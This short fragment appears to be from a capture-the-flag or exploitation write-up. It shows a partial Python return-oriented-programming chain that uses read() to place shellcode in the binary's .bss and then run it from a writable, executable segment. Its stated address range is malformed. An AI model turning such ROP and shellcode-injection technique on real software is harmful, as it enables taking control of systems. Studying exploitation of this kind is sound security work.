# Exploit Works  
Because your binary has all the gadgets you need, take advantage of the simple ROP technique with the gadget.  

```python  
def exploit():
  …
	p1 += flat(elf.plt['read'], p3r, 0, elf.bss() + 0x500, len(shellcode) + 1)
	p1 += flat(elf.bss() + 0x500)
  …
```

and write Shellcodes in rwx segment (0x0804a000-0x0804000), call it
